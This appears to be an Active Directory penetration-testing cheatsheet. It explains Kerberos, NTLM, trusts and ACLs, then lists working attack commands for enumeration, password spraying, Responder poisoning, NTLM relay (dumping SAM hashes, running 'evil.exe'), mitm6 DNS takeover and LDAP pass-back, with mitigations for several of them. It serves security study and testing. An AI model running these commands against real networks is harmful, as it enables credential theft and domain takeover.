Title: Active Directory Cheatsheet
Slug: ad/cheatsheet
Date: 1957-01-01 00:00
Category: Cheatsheet

## Concepts

Active Directory (AD) is a centralized directory service designed for managing Windows networks. It maintains a comprehensive database of network objects, facilitating the configuration of necessary settings.️

### Domain Controllers

A domain controller is a server with the AD DS server role:

- Hosts a copy of the **AD DS Data Store**
- Provides authentication and authorization services
- Replicates updates to other domain controllers in the **domain** or **forest**
- Allows administrative access to manage user accounts and network resources

### AD DS Data Store

The **AD DS Data Store** contains the database files and processes that store and manage information for users, services and applications such as users, objects, groups, password hashes, etc.:

- Consists into the `Ntds.dit` file
- It's stored by default in the `%SystemRoot%\NTDS` folder on all domain controllers 
- Is accessible only through domain controller processes and protocols or Administrator users

### AD DS Schema

The AD DS Schema defines every type of object that can be stored in the AD and enforces rules regarding object creation and configuration.

### Domains

Domains are used to group and manage object in an organization:

- Defines an administrative boundary for applying policies to group of objects.
- Defines a replication boundary for replication data between domain controllers.
- Defines an authentication and authorization boundary that provides a way to limit the scope of access to resources.

### Trees

Trees are a group of domains organized in a hierarchy, identifying parent and child domain. All domains in the tree:

- Share the namespace with the parent domain.
- Can have additional child domains.
- By default, they create a **two-way transitive trust with other domains*.

### Forests

A forest is a collection of one or more domain trees:

- Forests share a common schema.
- Forests share a common configuration partition.
- Forests share a common **Global Catalog (GC)** to enable searching.
- Forests **enable trusts between all the domains in the forest**.
- Forests share the Enterprise Admins and Schema Admins groups.

The **Global Catalog** is a feature of Active Directory (AD) that allows a domain controller (DC) to provide information on any object in the forest, It's used to locate objects outside its domain is beyond its scope.

- Domain controllers with the global catalog feature enabled are referred to as **global catalog servers**.

### Organizational Units (OUs)

Organizational Units are containers defined in a domain for users, groups, computers and other OUs. They're used to:

- Represent an organization hierarchically and logically.
- Manage a collection of objects in a consistent way.
- Delegate permissions to administer groups of objects.
- Apply Policies.

### Trusts

Trusts provide a mechanism for user to gain access to resources in another domain. 

There are two type of trusts:

- **Directional**: The trust direction flows from a *trusting domain* A to a *trusted domain* B. A trusts B and B can access A's resources (**One-way trust**). The trust can also be bi-directional (**Two-way-trust**) i.e. B trusts A and A can access B's resources. 
- **Transitive**: The trust relationship is extended to include other trusted domain beyond a two-domain trust. If a domain B trusts A and C trusts B, then C trusts A.
	- It's possible to define **Shortcut Trusts**, a direct trust between two domain that are transitively trusting each other via many other domains transitive trusts relationships to reduce access times in complex trust scenarios.

![[ad-trust-relations.png]]

Trust can be **automatic** in the same forest:

- All parent-child domains trust each other (is always two-way transitive).
- All domains in a forest trust all other domains in the forest (is always two-way transitive).

Instead, trusts across forests boundaries need to be explicitly established with **External Trusts** between two domains in different forests, when forests don't have a trust relationship:

- Can be one-way or two-way and is nontransitive.

It's possible to establish trusts between two forests (their root domains) with a **Forest Trust**:

- Can only be created between two forests and can't be implicitly extended to a third forest-
- Can be one-way or two-way and transitive (**domain-to-domain, not forest-to-forest!**) or nontransitive.


![[ad-forest-trusts.png]]

Trust relationships i represented by a **Trusted Domain Objects (TDOs)** in a domain.

### Objects

An object is anything that can be present in an OU or domain:

- **User**: enables network resource access for a user. Users are alos known as **security principals**, meaning that they can be authenticated by the domain and can be assigned privileges over **resources** like files or printers. Generally, a security principal is an object that can act upon resources in the network. **Users can be people or services**.
- **InetOrgPerson**: similar to a user account; used for compatibility with other directory services.
- **Contacts**: used to assign e-mail addresses to external users. Does not provide network access.
- **Security Groups**: used to simplify administration of access control. Security Groups are also considered security principals and, therefore, can have privileges over resources on the network. [Reference to existing groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)\*. **Groups can be member of other groups**.
- **Computers**: enable authentication and auditing of computer access to resources. Machines are also considered "security principals" and are assigned an account just as any regular user. This account has somewhat limited rights within the domain itself. The machine accounts themselves are **local administrators** on the assigned computer, they are generally not supposed to be accessed by anyone except the computer itself, but as with any other account, if you have the password, you can use it to log in.
	- Machine Account passwords are automatically rotated out and are generally comprised of 120 random characters.
	- They follow a specific naming scheme: the machine account name is the computer's name followed by a dollar sign (ex: for a machine named *DC01* there's the account *DC01$*). 
- **Printers**: used to simplify the process of locating and connecting to printers.
- **Shared Folders**: enables users to search for a shared folders based on properties.

Each object has a SID which uniquely identifies it in the domain; the SID is generally structured as follows:

- `S-<Revision level>-<Domain Identifier>-<Object ID (Relative Identifier)>`

Built-in object can be found [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers#well-known-sids).

**Note**: the difference between OUs and security groups is that the first are used to **apply policies to users and computers** whilst the latter is used to **grant permissions over resources**. A user or computer can belong to only one OU at a time whilst can be part of many security groups.

#### Protected Account and Groups

**Protected accounts and groups** are special objects where permissions are set and enforced via an automatic process that ensures the permissions on the objects remain consistent. These permissions remain even if you move the objects to different locations in Active Directory. If a protected object's permissions are modified, existing processes ensure that permissions are returned to their defaults quickly.

The following security accounts and groups are protected in Active Directory Domain Services:

- Account Operators
- Administrator
- Administrators
- Backup Operators
- Domain Admins
- Domain Controllers
- Enterprise Admins
- Enterprise Key Admins
- Key Admins
- Krbtgt
- Print Operators
- Read-only Domain Controllers
- Replicator
- Schema Admins
- Server Operators

 Following some Protected Groups, besides *Domain Admins*, *Enterprise Admin* and *Built-in Admins*, that are generally targeted due their capabilities:

- **Account Operators**: **cannot** modify the membership for *Domain Admins*, *Enterprise Admin* and *Built-in Admins* but **can** modify the membership of nested group within these.
- **Backup Operators**: can backup a GPO, edit it in order to add SID of a controlled account to a privileged group and then restore to apply the updates.
- **Server Oeprators**: can run a command as system (using the disabled Browser service)
- **Print Operators**: can copy `Ntds.dit` backup, load device drivers.

See [[active-directory-cheatsheet#AdminSDHolder|AdminSDHolder]].
### Group Policy Objects (GPO)

**Group Policy Objects (GPO)** are a collection of settings that can be applied to OUs. GPOs can contain policies aimed at either users or computers.

GPOs are distributed to the network via a network share called `SYSVOL`, stored in the DC.
All users in a domain should typically have access to this share over the network to sync their GPOs periodically. The SYSVOL share points by default to the `C:\Windows\SYSVOL\sysvol\` directory on each of the DCs in our network.

Once a change has been made to any GPOs, it might take up to 2 hours for computers to catch up. Alternatively, it's possible to force the sync with the following command:

~~~powershell
gpupdate /force
~~~

In GPO can be set a **restricted group**; these allow an administrator to define the following two properties for security-sensitive (restricted) groups:

- **Members**: defines who should and shouldn't belong to the restricted group.
- **Member Of**: specifies which other groups the restricted group should belong to.

Restricted groups are used to manage local group memberships of Windows workstations and servers from on a central way.

### Access Control Lists

In the access control model used by AD there are two main entities:

- **Access Tokens**: defines the security context for a process; contains the identity of its principal (a user or a group) and privileges associated to that principal.
- **Security Descriptors**: are data structure associated  ton an AD object that define its access control. It contains: 
	- the SID of the object owner.
	- a **Discretionary ACL (DACL)** containing the list of permissions that an access token must have to access the object.
	- a **System ACL (SACL)** that allows administrators to log attempts to access a secured object, defining the audit policy for that object.

Whenever a process wants to access an object into AD, it presents its **Access Token**. The access to this object is granted or not depending on its **Security Descriptor**.

An **Access Control List (ACL)** consists into a list of **Access Control Entries (ACE)**, each of which corresponds to individual permission or audits access. 
### Kerberos Authentication

**Kerberos** authentication is the default authentication protocol for any recent version of Windows. Users who log into a service using Kerberos will be assigned tickets.
Users with tickets can present them to a service to demonstrate they have already authenticated into the network before and are therefore enabled to use it.

The Kerberos authentication flow is the following:

1. The user sends its username and a timestamp (encrypted with a symmetric key - derived from the user password) in a `Authentication Service Request (AS_REQ)`, to the `Authentication Server (AS)`, a component of the `Key Distribution Center (KDC)`, generally installed on the DC.
2. If the credentials and the timestamp are successfully verified by the `AS` by using the user password  (stored in the `AS`), it will return the followings in an  `Authentication Server Reply (AS_REP)`:
	-  `Ticket Granting Ticket`: ticket that will be used by the user to request tickets to access specific services. It's encrypted with a key derived from  the `krbtgt` service account's password and therefore other users than `krbtgt` can't access its content.
	- `Session Key`: It's a symmetric key encrypted with a key derived from the user password. It's also contained in the `TGT`.
3. To access some service, the users contacts the `KDC`'s `Ticket Granting Service (TGS)` component, in charge of generating `Service Tickets (ST)`, tickets that are used to access the requested service. This is done with a `Ticket Granting Server Request (TGS-REQ)`, containing the followings:
	- Username and timestamp encrypted with the session key.
	- The `TGT`.
	- The `Service Principal Name (SPN)` identifying the resource that the user is trying to access
4.  The `TGS` then will check if the requested resource exists in the realm, decrypt the `TGT` and extract the session key from it in order to decrypt and validate the username and the timestamp. If everything checks out, the `TGS` will respond with a `Ticket Granting Server Reply (TGS-REP)`, containing the followings:
	- `Service Ticket (ST)`: Ticket encrypted with a key derived from the `Service Owner Hash`, a service account used to authenticate against the requested service.
	- `Service Session Key`: It's a symmetric key encrypted using the `Session Key`. It's also contained in the `ST`.
5. The user sends the `ST` along with the username and a timestamp encrypted with the `Service Session Key` to the request service application server in `Application Request (AP-REQ)`.
	1. \[Optional] - The application server passes the `Privilege Attribute Certificate (PAC)`, a Microsoft-specific authorization data present in the authorization data field of a ticket containing several logical components, including group membership data for authorization, alternate credentials for non-Kerberos authentication protocols, and policy control information for supporting interactive logon, to the `DC` in order to validate it (`KERB_VERIFY_PAC`).
	2. \[Optional] - After verifying the `PAC`, the `DC` returns a RPC status code depending on the outcome of the validation.
6. The application server decrypts the `ST` with its secret key (that is derived from the `Service Owner Hash`) and obtains the `Service Session Key` that uses to decrypt and validate the encrypted username and timestamp. If everything checks out, the user is granted to access the service with an `Application Server Reply (AP-REP)`.

**Kerberos Authentication Flow**

![[kerberos-auth-flow.png]]

Flow Summary:

1. User -> AS-REQ -> AS
2. AS -> AS-REP (TGT + Session Key) -> User
3. User -> TGS-REQ (TGT + SPN) -> TGS
4. TGS -> TGS-REP (ST + Service Session Key) -> User
5. User -> AS-REQ (ST) -> Service
6. Service -> AS-REP -> User

Key derived from user's account password in step *AS_REQ* is generated with one of the following algorithms:

- DES (default)
- RC4 (when using RC4, the key will be equal to the NTLM hash of the account's password)
- AES128
- AES256


**Note1**: The KDC is composed by the AS and the TGS.
**Note2**: The **ST** is more commonly referred as **TGS**.

**PAC Validation flow**

![[kerberos-pac-validation.png]]

PAC validation is generally disabled by default.



#### Service Principal Name (SPN)

An SPN is a unique identifier for a service on a network that uses Kerberos authentication. It consists of a service class, a host name, and sometimes a port. It's possible to register an SPN as follows:

~~~powershell
Setspn -s <service-class>/<computer-name>.<domain-name> <domain-user-account>
~~~
 
On a network that uses Kerberos authentication, a SPN for the server must be registered under either a built-in computer account (such as *NetworkService* or *LocalSystem*) or user account. SPNs are registered for built-in accounts automatically whilst are to be manually registered for domain user accounts.

### NetNTLM Authentication

#### LM vs NTLM vs Net-NTLMv1 vs Net-NTLMv2

**LM-hashes** is the oldest password storage used by Windows, obtainable, if still available, from the SAM database on a Windows system, or the NTDS database on the Domain Controller. LM was turned off by default starting in Windows Vista/Server 2008.

The algorithm is the following:

~~~
1. Convert all lower case to upper case  
2. Pad password to 14 characters with NULL characters  
3. Split the password to two 7 character chunks  
4. Create two DES keys from each 7 character chunk  
5. DES encrypt the string "KGS!@#$%" with these two chunks  
6. Concatenate the two DES encrypted strings. This is the LM hash.
~~~

**NTLM (or NTHash)** is used to store password hashs in modern Windows systems. It's obtainable by dumping the *SAM database* or the *NTDS* from a DC, using `Mimikatz`, etc.

The algorithm is the following:

~~~
MD4(UTF-16-LE(password))
~~~

**NetNTLMv1** is an authentication protocol that uses *NTLM* and *LM* in a challenge/response between the server and the client. Can be captured with the `responder` tool.

**NetNTLMv2** is an improved version of the previous protocol. Can be captured with the `responder` tool.

**Note**: NetNTLM is often referred to as "*Windows Authentication*".
#### Authentication Flow

Following the authentication flow for the **NetNTLMv2**:

1. The client sends an authentication request to the server they want to access.
2. The server generates a random number and sends it as a challenge to the client.
3. The client combines their NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.
4. The server forwards the challenge and the response to the Domain Controller for verification.
5. The domain controller uses the challenge to recalculate the response and compares it to the original response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.
6. The server forwards the authentication result to the client.

![[NTLM-authentication-flow.png]]

The user's password (or hash) is never transmitted through the network for security.

**Note:** The described process applies when using a **domain account**. If a local account is used, the server can verify the response to the challenge itself without requiring interaction with the domain controller since it has the password hash stored locally on its SAM.

### LSASS Process

**Local Security Authority Server Service (LSASS)** is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects.

## External Enumeration

Enumerate DC ip by querying DNS server:

~~~shell
nslookup -type=srv _ldap._tcp.dc._msdcs.<domain> <dns server>
~~~

Enumerate computers:

~~~shell
impacket-GetADComputers username[:password]@target
~~~

Enumerate users remotely:

~~~shell
# NetExec - anonymously
nxc smb <target host/network> --users

# NetExec - authenticated
nxc smb <target host/network> -u <username> -p <password> --users
nxc ldap <target host/network> -u <username> -p <password> --users

# rpcclient - anonymously
rpcclient -U "<domain>\\" <dc ip> -N
$> enumdomusers

# nmap - using a wordlist (OSINT)*
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<root domain>',userdb=<username wordlist>" <root dc ip>
~~~

\***Note**: as referred [here](https://nmap.org/nsedoc/scripts/krb5-enum-users.html), this method will not increase `badpwdcount` since it's not performing a logon but it's using the `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` Kerberos' error code to determine if the username is invalid.

Bruteforce users remotely with [kerbrute](https://github.com/ropnop/kerbrute):

~~~
kerbrute userenum --dc <domain controller> -d <domain> <wordlist>
~~~

Enumerate users remotely:

~~~shell
# rpcclient - anonymously
rpcclient -U "<domain>\\" <dc ip> -N
$> enumdomuser
$> queryuser <user RID>

# nxc - anonymously
nxc smb <dc ip> -u "" -p "" -d "<domain>" --users
~~~

Enumerate groups remotely:

~~~shell
# rpcclient - anonymously
rpcclient -U "<domain>\\" <dc ip> -N
$> enumdomgroups

# nxc - anonymously
nxc smb <dc ip> -u "" -p "" -d "<domain>" --groups

# NetExec - authenticated
nxc smb <target host/network> -u <username> -p <password> --groups
nxc ldap <target host/network> -u <username> -p <password> --groups
~~~

Enumerate groups memberships remoteley:

~~~shell
# All users
net rpc group members 'Domain Users' -W '<domain>' -I '<dc ip>' -U '%'

# Specific group
net rpc group members '<group>' -W '<domain>' -I '<dc ip>' -U '%'
~~~

Enumerate password policy:

~~~shell
# NetExec - anonymously
nxc smb <target host/network> --pass-pol

# NetExec - authenticated
nxc smb <target host/network> -u <username> -p <password> --pass-pol
~~~

Enumerate users trusted for delegation:

~~~shell
nxc ldap <target host/network> -u <username> -p <password> --trusted-for-delegation
~~~

Enumerate users with password not required:

~~~shell
nxc ldap <target host/network> -u <username> -p <password> --password-not-required
~~~

Enumerate shares:

~~~shell
# NetExec - anonymously
nxc smb <target host/network> -u 'anonymous' -p '' --shares

# NetExec - authenticated
nxc smb <target host/network> -u <username> -p <password> --shares
~~~

Enumerate Domain SID:

~~~shell
nxc ldap <target host/network> -u <username> -p <password> --get-sid
~~~

Enumerate users, groups, group memberships, password policy, shares, etc with `enum4linux`:

~~~
enum4linux <target host>
~~~


Use `ldapsearch` to run queries against a DC:

~~~shell
ldapsearch -H ldap://<dc ip> -D "<user>@<domain FQDN>" -w <password> -b '<base DN>' '<query>'
~~~

**Note**: `baseDN` for `this.domain.local` is `DC=this, DC=domain, DC=local`

Use `netexec` to run queries against a DC:

~~~shell
nxc ldap <target host/network> -u <username> -p <password> --query <query> <filter>
~~~

**Note**: `<filter>` is the list of attributes to retrieve; empty for all.

Common LDAP queries for Active Directory Pentesting (source [here - no more accessible](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/) ):

~~~ldap
# List all users
(&(objectCategory=person)(objectClass=user))

# List of all kerberoastables users
(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# List of all asrep-roastables users
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# Find all Users that need to change password on next login
(&(objectCategory=user)(pwdLastSet=0))

# Find all Users that are almost Locked-Out
(&(objectCategory=user)(badPwdCount>=4))

# Find all Users with *pass* or *pwd* in their description
(&(objectCategory=user)(|(description=*pass*)(description=*pwd*)))

# List of all users protected by adminCount
(&(objectCategory=user)(adminCount=1))

# List all groups
(objectCategory=group)

# List of all groups protected by adminCount
(&(objectCategory=group)(adminCount=1))

# Listing all servicePrincipalName
(servicePrincipalName=*)

# Listing specific services from their servicePrincipalName
(servicePrincipalName=http/*)
(servicePrincipalName=ldap/*)
(servicePrincipalName=kadmin/*)
(servicePrincipalName=mssqlsvc/*)

# Listing all computers with a given Operating System
(&(objectCategory=Computer)(operatingSystem=<OS version>*))

# Find all Workstations
(sAMAccountType=805306369)

# Find all computers having a KeyCredentialLink
(&(objectClass=computer)(msDS-KeyCredentialLink=*))

# Find all computers having an Obsolete OS
(&(objectCategory=Computer)(|(operatingSystem=Windows 2000*)(operatingSystem=Windows Vista*)(operatingSystem=Windows XP*)(operatingSystem=Windows 7*)(operatingSystem=Windows 8*)(operatingSystem=Windows Server 200*)(operatingSystem=Windows Server 2012*)))
~~~

## Initial Attack Vectors

### Password Spraying

If there are any exposed services using NetNTLM authentication, a list of possible usernames is available (ex: through OSINT) and a known password is available (ex: default password for new users), it's worth trying a **Password Spray** attack. 

This is a particular type of brute-force attack where, given a known password, it is used to perform login by testing various usernames/emails. 

Password spraying remotely with `netexec`:

~~~shell
nxc smb <target> -u <users list> -p <password|password list> --no-bruteforce
~~~

Password spraying with [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray):

~~~powershell
# On the whole domain
Invoke-DomainPasswordSpray -Password <password>

# Generate a list of users not disabled and not potentially lockable
Get-DomainUserList -Domain <domain> -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
# On users subset
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name  -PasswordList passlist.txt -OutFile sprayed-creds.txt
~~~

Password Spraying with [PasswordSprayer](https://github.com/ojack69/jacks-corner/blob/main/scripts/PowerShell/PasswordSprayer.ps1):

~~~powershell
.\PasswordSprayer.ps1 -Password <password>

# Use username as password
.\PasswordSprayer.ps1 -UsernameAsPassword
~~~

Rubeus password spraying:

~~~
Rubeus.exe brute /password:Password1 /noticket
~~~

### LLMNR/NBT-NS Poisoning

**Link Local Multicast Name Resolution (LLMNR)**, previously known as Netbios Nameservice (N BT-NS) is a protocol based on the Domain Name System (DNS) packet format that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local link. 
**It is used to resolve local name when the DNS fails**.

This service utilizes the user's username and NTLMv2 hash when appropriately responded; moreover it's unauthenticated and clear-text transmitted over UDP.  For these reasons it's easily spoofable and can be abused to obtain users password hashes that could be lately cracked.

It's possible to use the `responder` tool, an LLMNR, NBT-NS and MDNS poisoner.
It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool will only answer to File Server Service request, which is for SMB.

Setup various services listeners an respond with spoofed responses in order to perform poisoning:

~~~shell
responder -I <interface> -dw 
~~~

#### Mitigations

- Disable LLMNR/NBT-NS
- If it's not possible to disable it:
	-  Require Network Access Control
	- Require strong user password policy ( lenght >14 and limited common word usage)

### Relay Attacks

~~~quote
# Source: https://www.thehacker.recipes/ad/movement/ntlm/relay

The LM and NTLM authentication protocols are "application protocol-independent". It means one can relay LM or NTLM authentication messages over a certain protocol, say HTTP, over another, say SMB. That is called cross-protocols LM/NTLM relay.
~~~

Cross-protocol relays are resumed in the following image ([source](https://beta.hackndo.com/ntlm-relay/)):

![[ad-cross-protocol-relays.png]]

#### SMB Relay
Instead of cracking hashes gathered with `responder`,  those hashes are relayed to specific machines and potentially gain access.

Requirements for the attack to be applicable:

- **SMB signing** must be disabled on the target; SMB signing is a security mechanism in the SMB protocol. SMB signing means that every SMB message contains a signature that is generated by using the session key. The client puts a hash of the entire message into the signature field of the SMB header.
- **Relayed credentials must belong to an admin** on the machine with SMB signing disabled.
- It's not possible to use relayed credentials to target services on the same machine the credentials come from!

1 - Maps the network of live hosts and saves a list of only the hosts that don't require SMB signing:

~~~shell
nxc smb <target network/ip> --gen-relay-list relay_list.txt
# OR
nmap --script=smb2-security-mode.nse -p445 <target network/ip>
~~~

2 - Disable listening for SMB and HTTP protocols in the `responder`  by modifying `responder` config file, setting the protocols entries to `Off`:

~~~shell
vim /usr/share/responder/Responder.conf
responder -I <interface> -dw 
~~~

3 - Use `impacket`'s impacket-ntlmrelayx script:

~~~shell
# Dumps local SAM hashes
impacket-ntlmrelayx -tf relay_list.txt -smb2support

# Run with interactive mode (then connect with netcat to listening port)
impacket-ntlmrelayx -tf relay_list.txt -smb2support -i

# Run commands
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Run executable
impacket-ntlmrelayx -tf targets.txt -smb2support -e evil.exe

# Start SOCKS proxy*
impacket-ntlmrelayx -tf targets.txt -smb2support -socks --keep-relaying
~~~

\***Note**: in multi-relay mode (`-tf`), **when relaying fails against a target, no further targets will be processed until the relay receives new connection**. Use the `--keep-relaying` to prevent this (see [there](https://github.com/fortra/impacket/pull/1741)).

**Note**: Any recovered hashed credentials with `responder` are printed to STD OUT and also saved to a John the Ripper (see [[active-directory-cheatsheet#Cracking|Cracking]]) compliant file, located at `/usr/share/responder/logs/`

- The files are named in the following format - (Module-Name)-(HASH-TYPE)-(Client-IP).txt

#### LDAP Relay

~~~shell
# Simple relay
impacket-ntlmrelayx -t ldap://<DC IP>
impacket-ntlmrelayx -tf targets.txt -socks --keep-relaying

# Relaying SMB to LDAP abusing drop-the-mic vulnerability 
impacket-ntlmrelayx [-t ldap://<DC IP> | -tf targets.txt] -smb2support -remove-mic 
impacket-ntlmrelayx [-t ldap://<DC IP> | -tf targets.txt] -smb2support -remove-mic -socks --keep-relaying
~~~


When relaying to LDAP with the SOCKS proxy using tools such as `nxc` or other `impacket` scripts, it may possible to encounter the following error in `ntlmrelayx` console:

- `[-] LDAP: Received an unknown LDAP binding request, cannot continue `

This is due to the proxied tool to be attempting using SASL authentication, such as GSSAPI or GSS-SPNEGO, which the `ntlmrelayx` SOCKS proxy is not expecting or supporting.  To allow the tool work, it's necessary to edit the source code in order to disable **signing** and use legacy **sicily negotiation** authentication scheme.

For `nxc`, this can be done by editing the source code at `/usr/lib/python3/dist-packages/nxc/protocols/ldap.py`

1. Edit the method `check_ldap_signing` to `return` just after `self.signing_required = False`
2. Edit the method `plaintext_login` as  follows:

~~~python
528. # self.ldap_connection = ldap_impacket.LDAPConnection(url=ldap_url, baseDN=self.baseDN, dstIp=self.host, signing=self.auth_choice != "simple")
529. # self.ldap_connection.login(self.username, self.password, self.domain, self.lmhash, self.nthash, authenticationChoice=self.auth_choice)
self.ldap_connection = ldap_impacket.LDAPConnection(url=ldap_url, baseDN=self.baseDN, dstIp=self.host, signing=False)
self.ldap_connection.login(self.username, self.password, self.domain, self.lmhash, self.nthash, authenticationChoice='sicilyNegotiate')
~~~

In particular, force `signing=False` on `ldap_impacket.LDAPConnection` constructor invocation and `authenticationChoice='sicilyNegotiate'`  on `ldap_impacket.LDAPConnection.login` method invocation.

Notes: 

- This changes work for tools using `impacket` LDAP library.
- Actual code lines may vary from one version to another.

#### Drop-the-mic 

**CVE-2019-1019**, **CVE-2019-1040** and **CVE-2019-1166** are critical vulnerabilities in Microsoft's NTLM authentication, allowing attackers to bypass NTLM relay attack mitigations. These flaws enable credential forwarding by stripping MIC protections, making systems susceptible to privilege escalation and unauthorized access.

- Generally, it's not possible to relay SMB hashes to LDAP or SMB to SMB with required signing.
- By abusing these CVE, it's possible to bypass this limitation.
- **When the target supports NTLMv1 it's possible to bypass MIC checking since this version of NTLM does not support it.**

If the target server is vulnerable to **CVE-2019-1040** or supports NTLMv1 authentication, bypass MIC restriction with Impacket `ntlmrelayx`'s option `-remove-mic`.

If the target server is vulnerable to **CVE-2019-1019**, bypass MIC restriction with Impacket `ntlmrelayx`'s options `-remove-target` and `-machine-account`

Vulnerable versions:

- **Windows Server 2008 R2**
- **Windows Server 2012**
- **Windows Server 2012 R2**
- **Windows Server 2016**
- **Windows Server 2019** (before June 2019 patches)

#### Mitigations

- **SMB and LDAP Session Signing**    
    - Ensures message integrity by cryptographically signing SMB (Server Message Block) and LDAP (Lightweight Directory Access Protocol) communications.
    - Prevents attackers from modifying messages in transit.
    - Requires both client and server to support and enforce signing.
- **Extended Protection for Authentication (EPA)**
    - Introduces **Channel Binding Tokens (CBT)**, which bind authentication requests to a specific TLS session.
    - Prevents credential forwarding by ensuring authentication messages cannot be used outside their intended session.
    - Commonly used in LDAP over SSL/TLS and HTTP-based authentication.
- **Message Integrity Code (MIC)**
    - A cryptographic checksum included in NTLM authentication exchanges.
    - Prevents attackers from modifying authentication messages to perform a relay attack.
    - Requires NTLM session security to be enabled.

Suggested mitigation to apply:

- Enable SMB Signing on all devices:
	- **Pro**: Completely stops the attack
	- **Co**n: Can cause performance issues with file copies
- Disable NTLM authentication on network
	- **Pro**: Completely stops the attack
	- **Con**: If Kerberos stops working, Windows defaults back to NTLM
- Account tiering:
	- **Pro**: Limits domain admins to specific tasks (e.g. only log onto servers with need for DA)
	- **Con**: Enforcing the policy may be difficult
-  Local admin restriction:
	- **Pro**: Can prevent a lot of lateral movement
	- **Con**: Potential increase in the amount of service desk tickets
### DNS takeover via IPv6

Usually IPv6 is enabled but no DNS service is generally configured to respond to IPv6. IPv6 attacks abuses the default IPv6 configuration in Windows networks to spoof DNS replies by acting as a malicious DNS server and redirect traffic to an attacker specified endpoint.
IPv6 is enabled and preferred over IPv4 from Windows Vista and on.

By spoofing DNS, credentials get sent to the fake DNS server which will relay them to the target; when targeting a DC, it's possible to abuse this mechanism to obtain all the information stored int the DC and create evil accounts/policies to gain access to it or even new domain machines. This is possible when the relayed credentials belongs to an administrator.
In order to work, SMB (without signing - SMB Relay attack), LDAPS or any service to which relay the credentials should be enabled on the DC.

Start `mitm6` to respond with spoofed IPv6 DNS responses:

~~~shell
mitm6 -d <target domain>
~~~

Then relay captured hashes with `impacket-ntlmrelayx` (should wait 'till some DNS events happen):

~~~shell
# Perform a SMB relay attack
impacket-ntlmrelayx -6 -wh <attacker wpad spoofed domain> -t smb://<target> -smb2support 

# Abuse WPAD to dump useful information and create a new persisten account on the DC (an administrator should perform a login while listening)

## Using SMB (if enabled on the DC)
impacket-ntlmrelayx -6 -t <target DC> -wh <attacker wpad spoofed domain> -l lootdump -smb2support

## Using LDAP (if enabled on the DC)
impacket-ntlmrelayx -6 -t ldap://<target DC> -wh <attacker wpad spoofed domain> -l lootdump

# Add computer with delegation capabilities to relayed computer for Resource-based Constrained Delegation:
impacket-ntlmrelayx -6 -wh <attacker wpad spoofed domain> -t ldap://<target DC> -l lootdump --add-computer <new computer name> --delegate-access
~~~

Interesting resources:

- [NTLM Relaying and Kerberos Delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation)
- [mimtm6 - Compromising ipv4 network via ipv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- [Capture windows NTLMv2 hashes using an android device](https://github.com/zulfi0/android_snag_creds)

#### Mitigations

- IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. If IPv6 isn't used internally, the safest way to prevent `mitm6` is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. 
	- Disabling IPv6 entirely may have unwanted side effects. 
	- Setting the following predefined rules to *Block* instead of *Allow* prevents the attack from working:
		a. (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In)
		b. (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
		c. (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-Out)
- If WPAD is not in use internally, disable it via Group Policy and by disabling the **WinHttpAutoProxySvc service**.
- Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.
- Consider *Administrative* users to the *Protected Users* group or marking them as *Account* is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation. **Note**: the Administrator user (RID 500) will not benefit of these restrictions due to a default behaviour!

### LDAP Pass-back

Another method of AD authentication that applications can use is **Lightweight Directory Access Protocol (LDAP)** authentication. With this type of authentication, the application directly verifies the user's credentials by querying the LDAP. To do so, it necessarily has to hold its pair of AD credentials in order to authenticate itself to the LDAP.

LDAP authentication is often used with third-party (non-Microsoft) applications that integrate with AD, such as:

- Gitlab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs

One of the main attackers aim is to obtain those service AD credentials. 

**LDAP Pass-back** is a common attack against network devices, such as printers. This attack is possible when the attacker has the possibility to update the application's LDAP connection configuration (ex: through a vulnerable or unprotected printer web interface).
The LDAP Pass-back consists into forcing the target application to attempt an LDAP authentication to an attacker-controlled IP in order to leak the LDAP credentials by altering the configuration settings.

The smartest way to intercept those credentials is to host a rogue LDAP server since, generally, the targeted application will try to negotiate the LDAP authentication method details, selecting the most secure authentication method that both the target and the LDAP server support. 

If the authentication method is too secure, the credentials will not be transmitted in cleartext: for this reason, the rogue LDAP server has to downgrade the authentication method, forcing the credentials to be sent in cleartext.

This [LDAP server container](https://github.com/pedrojosenavasperez/ldap-passback-docker) is configured to support plaintext authentication, easing to perform a LDAP Pass-back attack.

### PXE Boot Image Retrieval

**Microsoft Deployment Toolkit (MDT)** is a Microsoft service that assists with automating the deployment of Microsoft Operating Systems (OS) to the organization machines. Essentially it allows the IT team to pre-configure and manage boot images.

The **System Center Configuration Manager (SCCM)** can be seen as almost an expansion of the MDT. It allows the IT team to review available updates to all software installed across the organization. The team can also test these patches in a sandbox environment to ensure they are stable before centrally deploying them to all domain-joined machines.

